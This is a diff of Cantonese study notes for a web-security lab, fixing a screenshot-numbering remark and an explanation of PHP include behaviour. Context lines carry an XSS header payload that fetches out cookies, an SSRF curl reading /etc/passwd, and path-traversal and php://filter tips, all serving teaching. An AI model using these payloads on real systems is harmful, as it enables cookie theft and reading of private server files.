@@ -518,7 +518,7 @@ X-Username: <img src=x onerror="fetch('/oauth.php?action=leak&c='+encodeURICompo
 
 > **圖示描述**：頁面顯示 highlight 標記「Cookie exfiltrated to attacker server」，確認外傳觸發（原教材截圖，本筆記不轉載圖片）。
 
-> ⚠️ 教材原文如此：本節步驟截圖編號出現跳號——步驟 6 先引用 **Screenshot 97**（netcat 畫面），再引用 **Screenshot 58**（lab marker）；即 58 理應早於 97，但原文喺此處逆序使用。呢個係原文截圖編號跳號（原文 §0 已知「Screenshot 01–110，號碼有跳」），非筆記錯誤。
+> ⚠️ 教材原文如此：本節步驟截圖編號出現跳號——步驟 6 先引用 **Screenshot 97**（netcat 畫面），再引用 **Screenshot 58**（lab marker）；即 58 理應早於 97，但原文喺此處逆序使用。呢個係原文截圖編號跳號（**全份 PDF 嘅截圖編號跨 01–110 而且有跳號**），非筆記錯誤。
 
 **原文結論**：應用把 header 值 echo 入問候語 `span` 而毫無編碼（見 `index.php` 嘅 `echo $_SERVER['HTTP_X_USERNAME']`）。因為反射喺元素內容而唔喺屬性或者 JavaScript 字串入面，攻擊者可以引入全新 tag 同 event handler，瀏覽器以網站完整權限執行佢哋。
 
@@ -739,7 +739,7 @@ curl "http://localhost:8080/imgproxy.php?url=file:///etc/passwd"
 > 1. **數唔清 `../` 層數**：唔知 web root 喺邊就估唔到要幾多層。實務上可以試由 3 層試到 10 層，睇邊個 response 出內容。
 > 2. **內容出現喺頁頂唔係 bug**：include 喺頁面組裝時行，所以檔案內容會喺 HTML header 之前印出，正常。
 > 3. **只想睇 source 唔想執行**：如果 include 會執行程式碼，你想睇 source 就可以用 PHP 包裝（例如 `php://filter/convert.base64-encode/resource=index.php`）——但注意本 lab 嘅 `include("lang/".$lang)` 有前綴，要配合 `../` 先用到。呢啲屬進階，原文只提及，唔係本 lab 主線。
-> 4. **`config.php.bak` 係副檔名 `.bak`**：`include` 對 `.bak` 檔會當純文字 print（PHP 只對 `.php` 等先執行，除非 URL 用 `?>` 技巧），所以你能見到 source。
+> 4. **為何 backup 檔會原樣顯示**：PHP 嘅 `include`／`require` 係**按檔案內容**決定執唔執行 —— 只要檔案含 `<?php ... ?>` 標籤就會被執行，**同副檔名無關**（`include 'x.bak'` 一樣會跑）。所以睇唔睇到 source，取決於該備份檔內容有冇 PHP 標籤（純文字就原樣輸出）。若真係想強制讀 source，才用 PHP filter 包裝（`php://filter/convert.base64-encode/resource=...`，見上一項）。
 > 5. **判別成功**：response 頂部出現 `/etc/passwd` 內容或 config source = 成功；若 response 完全正常、冇任何檔案內容 = 路徑層數唔啱或者參數唔係拼接落路徑。
 
 ### 6.4 §14 SSRF 新手拆解
